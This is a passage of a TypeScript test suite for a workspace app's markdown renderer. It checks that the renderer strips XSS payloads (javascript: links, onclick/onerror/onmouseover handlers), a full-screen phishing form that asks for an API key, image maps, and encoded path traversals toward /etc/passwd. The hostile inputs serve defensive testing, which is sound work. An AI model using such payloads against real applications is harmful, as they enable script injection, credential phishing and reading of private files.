    it('preserves nested inline markdown inside link text after stripping', () => {
      const html = renderMarkdownInline('[**bold link**](https://x)');
      expect(html).toContain('<strong>bold link</strong>');
      expect(html).not.toContain('<a ');
    });

    it('discards javascript:-scheme link targets along with the wrapper', () => {
      const html = renderMarkdownInline('[click me](javascript:alert(1))');
      expect(html).toContain('click me');
      expect(html).not.toContain('javascript:');
      expect(html).not.toContain('<a ');
    });

    it('still escapes dangerous tags from raw source', () => {
      const html = renderMarkdownInline('try <script>x</script> here');
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('strips raw inline HTML event handlers', () => {
      const html = renderMarkdownInline('<span onclick="alert(1)">tap</span>');
      expect(html).toContain('<span>tap</span>');
      expect(html).not.toContain('onclick');
      expect(html).not.toContain('alert(1)');
    });

    it('handles empty input', () => {
      expect(renderMarkdownInline('')).toBe('');
    });

    it('unwraps a raw link and shows raw form controls as text', () => {
      const html = renderMarkdownInline(
        'a <a href="https://example.com">link</a>, a <button>button</button>, <input value="x"> end',
      );
      const text = new DOMParser().parseFromString(html, 'text/html').body.textContent;
      expect(text).toBe('a link, a <button>button</button>, <input value="x"> end');
      expect(html).not.toMatch(/<(a|button|input)\b/);
    });
  });

  describe('thread reference links', () => {
    beforeEach(() => {
      base.workspaceId = null;
    });

    it('rewrites bare-UUID thread links into clickable thread chips', () => {
      const html = renderMarkdown('See [the bug](thread:1c2419a1-aaaa-bbbb-cccc-ddddeeeeffff)');
      expect(html).toContain('class="thread-link"');
      expect(html).toContain('data-thread-id="1c2419a1-aaaa-bbbb-cccc-ddddeeeeffff"');
      expect(html).not.toContain('href="thread:');
      expect(html).not.toContain('data-thread-workspace');
    });

    it('rewrites workspace-qualified thread links and preserves the workspace', () => {
      const html = renderMarkdown('See [the bug](thread:dev/1c2419a1-aaaa-bbbb-cccc-ddddeeeeffff)');
      expect(html).toContain('class="thread-link"');
      expect(html).toContain('data-thread-id="1c2419a1-aaaa-bbbb-cccc-ddddeeeeffff"');
      expect(html).toContain('data-thread-workspace="dev"');
      expect(html).not.toContain('href="thread:');
    });

    it('uses href="#" when not served behind the gateway (no workspace slug)', () => {
      const html = renderMarkdown('See [it](thread:0a11aaaa-bbbb-cccc-dddd-eeeeffff0009)');
      expect(html).toContain('href="#"');
      expect(html).toContain('class="thread-link"');
    });
  });

  describe('thread reference links — behind the gateway', () => {
    beforeEach(() => {
      base.workspaceId = 'myws';
      vi.stubGlobal('location', { origin: 'https://localhost:5251' });
    });
    afterEach(() => {
      vi.unstubAllGlobals();
      base.workspaceId = null;
    });

    it('points an untagged (same-workspace) link at the current workspace slug', () => {
      const html = renderMarkdown('See [the bug](thread:aa11aaaa-bbbb-cccc-dddd-eeeeffff0001)');
      expect(html).toContain('href="https://localhost:5251/myws/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0001"');
      expect(html).toContain('class="thread-link"');
    });

    it('points a cross-workspace link at the target workspace slug', () => {
      const html = renderMarkdown('See [the bug](thread:dev/aa11aaaa-bbbb-cccc-dddd-eeeeffff0002)');
      expect(html).toContain('href="https://localhost:5251/dev/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0002"');
      expect(html).toContain('data-thread-workspace="dev"');
    });

    it('slugifies the ref workspace name for the href (lowercased)', () => {
      const html = renderMarkdown('See [the bug](thread:Dev/aa11aaaa-bbbb-cccc-dddd-eeeeffff0003)');
      expect(html).toContain('href="https://localhost:5251/dev/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0003"');
      expect(html).toContain('data-thread-workspace="Dev"');
    });
  });

  describe('thread reference links — on and to a remote gateway', () => {
    it('scopes remote authored resources and CSS before insertion into the host', () => {
      base.workspaceId = 'notes@cloud';
      const html = sanitizeHtmlFragments('<img src="/~/api/v1/control/workspaces"><span style="background:url(/private)">text</span>');
      expect(html).not.toContain('src=');
      expect(html).not.toContain('style=');
      expect(html).toContain('text');
    });
    beforeEach(() => {
      vi.stubGlobal('location', { origin: 'https://localhost:5251' });
    });
    afterEach(() => {
      vi.unstubAllGlobals();
      base.workspaceId = null;
    });

    it('points a gateway-qualified link at its relayed route', () => {
      base.workspaceId = 'myws';
      const html = renderMarkdown('See [it](thread:dev@cloud/aa11aaaa-bbbb-cccc-dddd-eeeeffff0011)');
      expect(html).toContain('href="https://localhost:5251/dev@cloud/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0011"');
      expect(html).toContain('data-thread-workspace="dev@cloud"');
    });

    it("points an unqualified link inside a remote workspace at that gateway's workspace", () => {
      base.workspaceId = 'notes@cloud';
      const html = renderMarkdown('See [it](thread:dev/aa11aaaa-bbbb-cccc-dddd-eeeeffff0012)');
      expect(html).toContain('href="https://localhost:5251/dev@cloud/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0012"');
    });

    it('points an untagged link inside a remote workspace at that workspace', () => {
      base.workspaceId = 'notes@cloud';
      const html = renderMarkdown('See [it](thread:aa11aaaa-bbbb-cccc-dddd-eeeeffff0013)');
      expect(html).toContain('href="https://localhost:5251/notes@cloud/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0013"');
    });
  });

  describe('parse caching', () => {
    it('caches by input so a repeated render does not re-parse', () => {
      const spy = vi.spyOn(marked, 'parse');
      const md = '**cache-hit-unique-marker-alpha** with `code` and a list\n- one\n- two';
      const before = spy.mock.calls.length;
      const a = renderMarkdown(md);
      const b = renderMarkdown(md);
      expect(b).toBe(a);
      expect(spy.mock.calls.length).toBe(before + 1);
      spy.mockRestore();
    });

    it('cache:false bypasses the cache (streaming buffer never pollutes it)', () => {
      const spy = vi.spyOn(marked, 'parse');
      const md = '**cache-bypass-unique-marker-beta** streaming fragment';
      const before = spy.mock.calls.length;
      renderMarkdown(md, { cache: false });
      renderMarkdown(md, { cache: false });
      expect(spy.mock.calls.length).toBe(before + 2);
      spy.mockRestore();
    });
  });
});

describe('authored form controls, image maps and the top layer', () => {
  const ARTIFACT_PAYLOAD =
    '<form action="https://example.com/collect" method="post" style="position:fixed;inset:0;z-index:2147483647;background:white"><input type="password" name="api_key"><button>Connect</button></form>';

  const RENDERERS: [string, (src: string) => string][] = [
    ['renderMarkdown', (src) => renderMarkdown(src, { cache: false })],
    ['renderMarkdownInline', renderMarkdownInline],
    ['sanitizeHtmlFragments', sanitizeHtmlFragments],
  ];

  const FORM_CONTROLS = `form, button, select, textarea, option, optgroup, datalist, input:not([${TASK_CHECKBOX_ATTR}="${COPY_ID_NONCE}"])`;

  const parse = (html: string) => new DOMParser().parseFromString(html, 'text/html').body;

  describe.each(RENDERERS)('%s', (_name, render) => {
    it.each([
      ['the artifact payload', ARTIFACT_PAYLOAD],
      ['a forged task checkbox', `<input ${TASK_CHECKBOX_ATTR}="0000" type="text" name="k">`],
      ['mixed case', '<FoRm action="https://example.com/c"><InPuT type=password><BUTTON>go</BUTTON></FoRm>'],
      ['unclosed tags', '<form action="https://example.com/c"><input type=password><button>go'],
      ['a select and a textarea', '<select><option>a</option><optgroup><option>b</option></optgroup></select><textarea>t</textarea>'],
      ['a datalist', '<datalist id="d"><option value="a"></datalist>'],
    ])('renders no form control for %s', (_label, src) => {
      expect(parse(render(src)).querySelector(FORM_CONTROLS)).toBeNull();
    });

    it.each(['popover', 'popovertarget', 'popovertargetaction', 'command', 'commandfor'])(
      'drops the %s attribute',
      (attr) => {
        const html = render(`<div ${attr}="x">a</div><span ${attr}>b</span>`);
        expect(html).not.toMatch(new RegExp(`\\s${attr}=`, 'i'));
      },
    );

    it.each([
      ['an image map', '<img src="x.png" usemap="#m"><map name="m"><area shape="rect" coords="0,0,9999,9999" href="https://example.com/c"></map>'],
      ['mixed case', '<MaP name="m"><AREA href="https://example.com/c"></MaP>'],
      ['a lone area', '<area href="https://example.com/c" target="_top">'],
    ])('renders no image map for %s', (_label, src) => {
      expect(parse(render(src)).querySelector('map, area')).toBeNull();
    });
  });

  it('shows an authored image map area as the text the author wrote', () => {
    const body = parse(renderMarkdown('See <area href="https://example.com/c"> here', { cache: false }));
    expect(body.textContent).toContain('<area href="https://example.com/c">');
  });

  it('shows an authored button as the text the author wrote', () => {
    const body = parse(renderMarkdown('Press <button>Connect</button> now', { cache: false }));
    expect(body.textContent).toContain('<button>Connect</button>');
  });

  it('keeps the renderer task checkbox', () => {
    const body = parse(renderMarkdown('- [ ] todo\n- [x] done', { cache: false }));
    expect(body.querySelectorAll(`input[type="checkbox"][${TASK_CHECKBOX_ATTR}="${COPY_ID_NONCE}"]`)).toHaveLength(2);
  });

  it.each(RENDERERS)('%s rebuilds a checkbox that carries the real nonce', (_name, render) => {
    const forged = `<input ${TASK_CHECKBOX_ATTR}="${COPY_ID_NONCE}" type="submit" form="f" formaction="https://example.com/c" checked>`;
    const input = parse(render(forged)).querySelector('input');
    const expected = parse(taskCheckboxTag(true)).querySelector('input');
    expect(input?.getAttributeNames().sort()).toEqual(expected?.getAttributeNames().sort());
    expect(input?.type).toBe('checkbox');
    expect(input?.disabled).toBe(true);
    expect(input?.checked).toBe(true);
  });

  it('keeps the Copy button on a fenced code block', () => {
    const body = parse(renderMarkdown('```sh\nnpm i\n```', { cache: false }));
    expect(body.querySelector('.code-block-header .copy-btn.code-block-copy-btn svg')).not.toBeNull();
  });

  it('keeps authored inline style for slides and diffs', () => {
    expect(sanitizeHtmlFragments('<div style="color: red; padding: 1rem">x</div>'))
      .toContain('style="color: red; padding: 1rem"');
  });
});

describe('renderMarkdown images', () => {
  const servedAt = (baseUrl: string, pathname: string) => {
    lucidos.configure({ baseUrl });
    vi.stubGlobal('location', { origin: 'https://localhost:5251', pathname, search: '' });
  };
  const imgSrc = (html: string) => html.match(/<img[^>]*\ssrc="([^"]*)"/)?.[1];

  beforeEach(() => {
    base.workspaceId = 'myws';
    servedAt('/myws', '/myws/');
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    lucidos.configure({ baseUrl: '' });
    base.workspaceId = null;
  });

  it.each(['block', 'inline', 'fragment'])('resolves remote images before scoping: %s', (entry) => {
    base.workspaceId = 'demo@remote';
    servedAt('/demo@remote', '/demo@remote/');
    const source = 'artifacts/diagram%20one.png#320x200';
    const html = entry === 'block'
      ? renderMarkdown(`![diagram](${source})`, { cache: false })
      : entry === 'inline'
        ? renderMarkdownInline(`![diagram](${source})`)
        : sanitizeHtmlFragments(`<img src="${source}">`);
    expect(imgSrc(html)).toBe('/demo@remote/data/artifacts/diagram%20one.png');
    expect(html.match(/class="image-scroll-wrapper"/g)).toHaveLength(1);
    expect(html).toContain('--hint-w: 320');
  });

  it('resolves a workspace-relative source through the data mount', () => {
    const html = renderMarkdown('![right aligned](artifacts/screenshots/hero.png)', { cache: false });
    expect(imgSrc(html)).toBe('/myws/data/artifacts/screenshots/hero.png');
  });

  it('carries no workspace prefix when served directly on an engine port', () => {
    base.workspaceId = null;
    servedAt('', '/');
    const html = renderMarkdown('![alt](artifacts/screenshots/hero.png)', { cache: false });
    expect(imgSrc(html)).toBe('/data/artifacts/screenshots/hero.png');
  });

  it('resolves the other workspace directories the same way', () => {
    for (const dir of ['apps', 'knowhow', 'triggers']) {
      const html = renderMarkdown(`![alt](${dir}/thing/logo.png)`, { cache: false });
      expect(imgSrc(html)).toBe(`/myws/data/${dir}/thing/logo.png`);
    }
  });

  it('routes system-knowhow through the API endpoint, not the static mount', () => {
    const html = renderMarkdown('![diagram](system-knowhow/diagram.png)', { cache: false });
    expect(imgSrc(html)).toBe('/myws/api/v1/data/system-knowhow/diagram.png');
  });

  it('encodes a source exactly once', () => {
    const html = renderMarkdown('![alt](artifacts/æøå.png)', { cache: false });
    expect(imgSrc(html)).toBe('/myws/data/artifacts/%C3%A6%C3%B8%C3%A5.png');
  });

  it('leaves an absolute URL untouched, but still wraps it', () => {
    const html = renderMarkdown('![alt](https://example.com/x.png)', { cache: false });
    expect(imgSrc(html)).toBe('https://example.com/x.png');
    expect(html).toContain('<span class="image-scroll-wrapper">');
  });

  it('leaves an already-absolute site path untouched', () => {
    const html = renderMarkdown('![alt](/already/absolute.png)', { cache: false });
    expect(imgSrc(html)).toBe('/already/absolute.png');
  });

  it('leaves a protocol-relative source untouched', () => {
    const html = renderMarkdown('![alt](//cdn.example.com/x.png)', { cache: false });
    expect(imgSrc(html)).toBe('//cdn.example.com/x.png');
  });

  it('leaves a relative path outside the workspace allowlist alone', () => {
    const html = renderMarkdown('![alt](foo/bar.png)', { cache: false });
    expect(imgSrc(html)).toBe('foo/bar.png');
  });

  it('refuses a source that walks out of the workspace', () => {
    const html = renderMarkdown('![alt](artifacts/../../etc/passwd)', { cache: false });
    expect(imgSrc(html)).toBe('artifacts/../../etc/passwd');
    expect(html).not.toContain('/data/');
  });

  it('refuses a percent-encoded traversal too', () => {
    const html = renderMarkdown('![alt](artifacts/%2e%2e/%2e%2e/etc/passwd)', { cache: false });
    expect(imgSrc(html)).toBe('artifacts/%2e%2e/%2e%2e/etc/passwd');
    expect(html).not.toContain('/data/');
  });

  it('refuses a traversal hidden behind an encoded separator', () => {
    const html = renderMarkdown('![alt](artifacts/%2e%2e%2f%2e%2e/api/v1/health)', { cache: false });
    expect(imgSrc(html)).toBe('artifacts/%2e%2e%2f%2e%2e/api/v1/health');
    expect(html).not.toContain('/data/');
  });

  it('keeps a query string a query rather than folding it into the file name', () => {
    const html = renderMarkdown('![alt](artifacts/x.png?v=2)', { cache: false });
    expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png?v=2');
  });

  it('does not re-escape an ampersand the author already escaped', () => {
    const html = renderMarkdown('![alt](artifacts/x.png?a=1&amp;b=2)', { cache: false });
    expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png?a=1&amp;b=2');
    expect(html).not.toContain('&amp;amp;');
  });

  it('keeps a fragment attached after the path', () => {
    const html = renderMarkdown('![alt](artifacts/chart.svg#detail)', { cache: false });
    expect(imgSrc(html)).toBe('/myws/data/artifacts/chart.svg#detail');
  });

  describe('in a repository document', () => {
    const doc = (path: string, rev: { ref?: string; changeId?: string } = {}) =>
      ({ kind: 'repo', repoId: 'repo-1', path, ...rev }) as const;
    const render = (md: string, document: ReturnType<typeof doc>) =>
      renderMarkdown(md, { cache: false, document });
    const fileUrl = (path: string, ref?: string) => {
      const params = new URLSearchParams({ path });
      if (ref) params.set('ref', ref);
      return `/myws/api/v1/repositories/repo-1/file?${params}`.replace(/&/g, '&amp;');
    };
    const imgOf = (html: string) =>
      new DOMParser().parseFromString(html, 'text/html').querySelector('img')!;

    it('resolves an image against the document folder', () => {
      const html = render('![LLM call flow](images/guide/llm-call-flow.png)', doc('docs/guide.md'));
      expect(imgSrc(html)).toBe(fileUrl('docs/images/guide/llm-call-flow.png'));
    });

    it('resolves a raw HTML image the same way', () => {
      const html = render('<img src="assets/banner.png" alt="Project banner">', doc('README.md'));
      expect(imgSrc(html)).toBe(fileUrl('assets/banner.png'));
    });

    it('follows a ../ that stays inside the checkout', () => {
      const html = render('![x](../assets/logo.png)', doc('docs/guide/setup.md'));
      expect(imgSrc(html)).toBe(fileUrl('docs/assets/logo.png'));
    });

    it('anchors a leading slash at the checkout root', () => {
      const html = render('![x](/assets/logo.png)', doc('docs/guide/setup.md'));
      expect(imgSrc(html)).toBe(fileUrl('assets/logo.png'));
    });

    it('carries the branch the document was read at', () => {
      const html = render('![x](img/a.png)', doc('docs/x.md', { ref: 'feature/images' }));
      expect(imgSrc(html)).toBe(fileUrl('docs/img/a.png', 'feature/images'));
    });

    it('reads the image from the change a whole-file view shows', () => {
      const html = render('![x](img/a.png)', doc('docs/x.md', { changeId: 'change-9', ref: 'branch' }));
      expect(imgSrc(html)).toBe('/myws/api/v1/changes/change-9/file?path=docs%2Fimg%2Fa.png');
    });

    it('drops a query the file URL has no use for', () => {
      const html = render('![x](img/a.png?raw=true)', doc('README.md'));
      expect(imgSrc(html)).toBe(fileUrl('img/a.png'));
    });

    it('decodes before resolving, so a space is encoded once', () => {
      const html = render('![x](<my pics/a b.png>)', doc('README.md'));
      expect(imgSrc(html)).toBe(fileUrl('my pics/a b.png'));
    });

    it('leaves an absolute URL alone', () => {
      const html = render('![x](https://example.com/x.png)', doc('README.md'));
      expect(imgSrc(html)).toBe('https://example.com/x.png');
    });

    it('refuses a ../ that climbs out of the checkout, and never fetches it', () => {
      const html = render(
        '![chunk split](../../../crates/lucidos-app/x.png)',
        doc('docs/plans/2026-09-26-entry-chunk-first-paint-split.md'),
      );
      const img = imgOf(html);
      expect(img.hasAttribute('src')).toBe(false);
      expect(img.hasAttribute('data-load-failed')).toBe(true);
      expect(html).toContain('Image not available: chunk split');
      expect(html).toContain('<code>../../../crates/lucidos-app/x.png</code>');
      expect(img.parentElement?.className).toBe('image-scroll-wrapper');
    });

    it('refuses an encoded climb, however it is spelled', () => {
      for (const src of ['%2e%2e/%2e%2e/x.png', 'a/%2e%2e%2f%2e%2e%2f..%2fx.png', '..%5c..%5cx.png']) {
        expect(imgOf(render(`<img src="${src}">`, doc('docs/x.md'))).hasAttribute('src')).toBe(false);
      }
    });

    it('refuses a malformed escape rather than guessing', () => {
      expect(imgOf(render('<img src="img/%zz.png">', doc('docs/x.md'))).hasAttribute('src')).toBe(false);
    });
  });

  describe('in a workspace document', () => {
    const doc = { kind: 'workspace', path: 'artifacts/reports/weekly.md' } as const;
    const render = (md: string) => renderMarkdown(md, { cache: false, document: doc });

    it('keeps a source naming a workspace directory root-relative', () => {
      expect(imgSrc(render('![x](artifacts/screenshots/hero.png)'))).toBe('/myws/data/artifacts/screenshots/hero.png');
    });

    it('resolves a sibling and a ../ against the document folder', () => {
      expect(imgSrc(render('![x](pic.png)'))).toBe('/myws/data/artifacts/reports/pic.png');
      expect(imgSrc(render('![x](./charts/a.png?v=2)'))).toBe('/myws/data/artifacts/reports/charts/a.png?v=2');
      expect(imgSrc(render('![x](../img/pic.png)'))).toBe('/myws/data/artifacts/img/pic.png');
    });

    it('refuses a source that climbs out of the data root', () => {
      const html = render('![x](../../../etc/passwd)');
      expect(html).not.toContain('/data/');
      expect(html).toContain('data-load-failed');
    });

    it('refuses a climb that starts at a workspace directory', () => {
      expect(render('![x](artifacts/../../etc/passwd)')).toContain('data-load-failed');
    });
  });

  describe('size hint', () => {
    const imgOf = (html: string) =>
      new DOMParser().parseFromString(html, 'text/html').querySelector('img')!;

    it('stamps the size and strips the hint from the served source', () => {
      const img = imgOf(renderMarkdown('![alt](artifacts/x.png#1600x1200)', { cache: false }));
      expect(img.getAttribute('src')).toBe('/myws/data/artifacts/x.png');
      expect(img.getAttribute('data-size-hint')).toBe('');
      expect(img.getAttribute('style')).toBe('--hint-w: 1600; --hint-h: 1200;');
    });

    it('stamps a hinted absolute URL too', () => {
      const img = imgOf(renderMarkdown('![alt](https://example.com/x.png#40x30)', { cache: false }));
      expect(img.getAttribute('src')).toBe('https://example.com/x.png');
      expect(img.hasAttribute('data-size-hint')).toBe(true);
    });

    it('stamps the inline variant a question option renders', () => {
      const img = imgOf(renderMarkdownInline('![alt](artifacts/x.png#800x600)'));
      expect(img.getAttribute('src')).toBe('/myws/data/artifacts/x.png');
      expect(img.getAttribute('style')).toBe('--hint-w: 800; --hint-h: 600;');
    });

    it('keeps an inline style the author gave a raw image', () => {
      const img = imgOf(renderMarkdown('<img style="opacity: 0.5" src="artifacts/x.png#40x30">', { cache: false }));
      expect(img.style.getPropertyValue('opacity')).toBe('0.5');
      expect(img.style.getPropertyValue('--hint-w')).toBe('40');
    });

    it('leaves an unhinted image unstamped', () => {
      const img = imgOf(renderMarkdown('![alt](artifacts/x.png)', { cache: false }));
      expect(img.hasAttribute('data-size-hint')).toBe(false);
      expect(img.hasAttribute('style')).toBe(false);
    });

    it('treats any other fragment as the author\'s own', () => {
      for (const src of ['artifacts/x.svg#detail', 'artifacts/x.png#0x10', 'artifacts/x.png#10x']) {
        const img = imgOf(renderMarkdown(`![alt](${src})`, { cache: false }));
        expect(img.hasAttribute('data-size-hint'), src).toBe(false);
        expect(img.getAttribute('src'), src).toBe(`/myws/data/${src}`);
      }
    });
  });

  it('still strips a data: image URI, exactly as before the rewrite existed', () => {
    const html = renderMarkdown('![alt](data:image/png;base64,AAAA)', { cache: false });
    expect(html).not.toContain('data:image/png');
    expect(html).toContain('<img alt="alt">');
  });

  it('wraps the image in the scroll container with the rewrite applied inside it', () => {
    const html = renderMarkdown('![right aligned](artifacts/screenshots/hero.png)', { cache: false });
    expect(html).toContain(
      '<span class="image-scroll-wrapper">'
      + '<img src="/myws/data/artifacts/screenshots/hero.png" alt="right aligned">'
      + '</span>',
    );
  });

  it('gives two images in one document a wrapper each', () => {
    const html = renderMarkdown('![a](artifacts/one.png)\n\n![b](artifacts/two.png)', { cache: false });
    expect(html.match(/<span class="image-scroll-wrapper">/g)).toHaveLength(2);
    expect(html).toContain('src="/myws/data/artifacts/one.png"');
    expect(html).toContain('src="/myws/data/artifacts/two.png"');
  });

  it('wraps no image for an <img written inside an attribute value', () => {
    const html = renderMarkdown(
      '<a href="#" title="<img src=x onerror=alert(1)>">hi</a>',
      { cache: false },
    );
    const doc = new DOMParser().parseFromString(html, 'text/html');
    expect(doc.querySelector('img')).toBeNull();
    expect(doc.querySelector('.image-scroll-wrapper')).toBeNull();
    expect(doc.querySelector('a')!.getAttribute('title'))
      .toBe('<img src=x onerror=alert(1)>');
  });

  it('leaves the anchor structure of a linked image intact', () => {
    const html = renderMarkdown('[![alt](artifacts/x.png)](https://example.com)', { cache: false });
    expect(html).toContain(
      '<a href="https://example.com">'
      + '<span class="image-scroll-wrapper"><img src="/myws/data/artifacts/x.png" alt="alt"></span>'
      + '</a>',
    );
  });

  it('rewrites AND wraps an inline-variant image, like a reply image', () => {
    const html = renderMarkdownInline('see ![alt](artifacts/x.png) here');
    expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png');
    expect(html).toContain(
      '<span class="image-scroll-wrapper"><img src="/myws/data/artifacts/x.png" alt="alt"></span>',
    );
  });

  it('transforms a table and an image in the same document without corrupting either', () => {
    const md = [
      '| A | B | C | D |',
      '| --- | --- | --- | --- |',
      '| w | x | y | z |',
      '',
      '![alt](artifacts/x.png)',
    ].join('\n');
    const html = renderMarkdown(md, { cache: false });
    expect(html).toContain('<div class="table-scroll-wrapper"><table data-stack="">');
    expect(html).toContain('<td data-label="A">w</td>');
    expect(html).toContain('<span class="image-scroll-wrapper">');
    expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png');
  });

  it('wraps and rewrites an image sitting inside a table cell', () => {
    const md = ['| A | B |', '| --- | --- |', '| ![alt](artifacts/x.png) | y |'].join('\n');
    const html = renderMarkdown(md, { cache: false });
    expect(html).toContain('<div class="table-scroll-wrapper"><table>');
    expect(html).toContain(
      '<td><span class="image-scroll-wrapper">'
      + '<img src="/myws/data/artifacts/x.png" alt="alt">'
      + '</span></td>',
    );
  });
});

describe('renderMarkdown tables', () => {
  const mdRow = (cells: string[]) => `| ${cells.join(' | ')} |`;
  const mdTable = (headers: string[], ...rows: string[][]) =>
    [mdRow(headers), mdRow(headers.map(() => '---')), ...rows.map(mdRow)].join('\n');
  const labels = (html: string) =>
    [...html.matchAll(/data-label="([^"]*)"/g)].map((m) => m[1]);

  it('keeps the grid below the stack threshold', () => {
    for (const cols of [2, 3]) {
      const headers = Array.from({ length: cols }, (_, i) => `H${i}`);
      const html = renderMarkdown(mdTable(headers, headers.map((_, i) => `v${i}`)));
      expect(html).toContain('<div class="table-scroll-wrapper"><table>');
      expect(html).not.toContain('data-stack');
      expect(html).not.toContain('data-label');
    }
  });

  it('stacks at and above the threshold, labelling every cell', () => {
    for (const cols of [4, 5]) {
      const headers = Array.from({ length: cols }, (_, i) => `H${i}`);
      const html = renderMarkdown(mdTable(headers, headers.map((_, i) => `v${i}`)));
      expect(html).toContain('<div class="table-scroll-wrapper"><table data-stack="">');
      expect(html).toContain('</table></div>');
      expect(labels(html)).toEqual(headers);
    }
  });

  it('restarts the labels on every row', () => {
    const html = renderMarkdown(
      mdTable(['A', 'B', 'C', 'D'], ['1', '2', '3', '4'], ['5', '6', '7', '8'])
    );
    expect(labels(html)).toEqual(['A', 'B', 'C', 'D', 'A', 'B', 'C', 'D']);
  });

  it('pairs each label with its own cell, not the next one', () => {
    const html = renderMarkdown(mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']));
    expect(html).toContain('<td data-label="A">w</td>');
    expect(html).toContain('<td data-label="D">z</td>');
  });

  it('keeps alignment attributes marked emits on a cell', () => {
    const md = [
      '| A | B | C | D |',
      '| :-- | :-: | --: | --- |',
      '| w | x | y | z |',
    ].join('\n');
    const html = renderMarkdown(md);
    expect(html).toContain('<td align="center" data-label="B">x</td>');
  });

  it('escapes a header so it cannot break out of the attribute', () => {
    const html = renderMarkdown(mdTable(['a"b', 'A & B', 'C', 'D'], ['w', 'x', 'y', 'z']));
    expect(html).toContain('data-label="a&quot;b"');
    expect(html).toContain('data-label="A &amp; B"');
    expect(html).not.toContain('&amp;amp;');
  });

  const HEADER_PAYLOAD = 'X onmouseover=alert(1) Y';
  const handlerCarriers = (html: string) =>
    [...new DOMParser().parseFromString(html, 'text/html').querySelectorAll('*')]
      .filter((el) => el.getAttributeNames().some((name) => name.startsWith('on')))
      .map((el) => el.tagName);

  it('keeps a header out of attribute position when a cell attribute carries a >', () => {
    const html = renderMarkdown(
      `<table><tr><th>${HEADER_PAYLOAD}</th><th>B</th><th>C</th><th>D</th></tr>`
      + '<tr><td title="a>b">w</td><td>x</td><td>y</td><td>z</td></tr></table>',
    );
    expect(handlerCarriers(html)).toEqual([]);
    const cell = new DOMParser().parseFromString(html, 'text/html').querySelector('td');
    expect(cell!.getAttributeNames()).toEqual(['title', 'data-label']);
    expect(cell!.getAttribute('title')).toBe('a>b');
    expect(cell!.getAttribute('data-label')).toBe(HEADER_PAYLOAD);
    expect(cell!.textContent).toBe('w');
  });

  it('stamps no cell for a <td written inside an attribute value', () => {
    const html = renderMarkdown(
      `<table><tr><th><span title="<td a=1>">${HEADER_PAYLOAD}</span></th>`
      + '<th>B</th><th>C</th><th>D</th><td>q</td></tr>'
      + '<tr><td>w</td><td>x</td><td>y</td><td>z</td></tr></table>',
    );
    expect(handlerCarriers(html)).toEqual([]);
    const doc = new DOMParser().parseFromString(html, 'text/html');
    expect(doc.querySelector('span')!.getAttribute('title')).toBe('<td a=1>');
    expect(labels(html)).toEqual([HEADER_PAYLOAD, HEADER_PAYLOAD, 'B', 'C', 'D']);
  });

  it("a header's angle brackets stay in the label and never become a handler", () => {
    const html = renderMarkdown(
      mdTable(['q>https://e.com/onmouseover=x;//', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']),
      { cache: false },
    );
    expect(labels(html)).toEqual(['q>https://e.com/onmouseover=x;//', 'B', 'C', 'D']);
    const linked = linkifyPaths(html, [], []);
    const doc = new DOMParser().parseFromString(linked, 'text/html');
    const handlers = [...doc.querySelectorAll('*')]
      .filter((el) => el.getAttributeNames().some((name) => name.startsWith('on')));
    expect(handlers).toEqual([]);
  });

  it('counts and labels a nested table apart from the one holding it', () => {
    const html = renderMarkdown(
      '<table><tr><th>A</th><th>B</th></tr>'
      + '<tr><td><table><tr><th>N1</th><th>N2</th><th>N3</th><th>N4</th></tr>'
      + '<tr><td>1</td><td>2</td><td>3</td><td>4</td></tr></table></td>'
      + '<td>q</td></tr></table>',
      { cache: false },
    );
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const [outer, inner] = Array.from(doc.querySelectorAll('table'));
    expect(outer.hasAttribute('data-stack')).toBe(false);
    expect(Array.from(outer.rows[1].cells, (c) => c.hasAttribute('data-label')))
      .toEqual([false, false]);
    expect(inner.hasAttribute('data-stack')).toBe(true);
    expect(Array.from(inner.rows[1].cells, (c) => c.getAttribute('data-label')))
      .toEqual(['N1', 'N2', 'N3', 'N4']);
  });

  it('reduces a header carrying markup to its plain text', () => {
    const html = renderMarkdown(mdTable(['`code`', '**bold**', '[l](https://e.com)', 'D'], ['w', 'x', 'y', 'z']));
    expect(labels(html)).toEqual(['code', 'bold', 'l', 'D']);
    for (const label of labels(html)) expect(label).not.toContain('<');
  });

  it('drops an inline HTML tag in a header rather than labelling with it', () => {
    const html = renderMarkdown(mdTable(['<img src=x>', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']));
    expect(labels(html)).toEqual(['', 'B', 'C', 'D']);
  });

  it('labels the padded cells of a short row, which stay empty for the CSS to hide', () => {
    const md = ['| A | B | C | D |', '| --- | --- | --- | --- |', '| w | x |'].join('\n');
    const html = renderMarkdown(md);
    expect(labels(html)).toEqual(['A', 'B', 'C', 'D']);
    expect(html).toContain('<td data-label="C"></td>');
  });

  it('is stable across repeated renders of the same table', () => {
    const md = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
    const first = renderMarkdown(md, { cache: false });
    const second = renderMarkdown(md, { cache: false });
    expect(second).toBe(first);
    expect(labels(second)).toEqual(['A', 'B', 'C', 'D']);
  });

  it('leaves nothing behind for the next render', () => {
    const table = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
    const image = '![a](artifacts/one.png)';
    const plain = 'just prose';
    const first = renderMarkdown(table, { cache: false });
    renderMarkdown(image, { cache: false });
    expect(renderMarkdown(plain, { cache: false })).toBe('<p>just prose</p>\n');
    expect(renderMarkdown(table, { cache: false })).toBe(first);
  });

  it('transforms every table in a document independently', () => {
    const wide = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
    const narrow = mdTable(['E', 'F'], ['1', '2']);
    const html = renderMarkdown(`${wide}\n\n${narrow}`);
    expect(html.match(/<div class="table-scroll-wrapper">/g)).toHaveLength(2);
    expect(html.match(/<table data-stack="">/g)).toHaveLength(1);
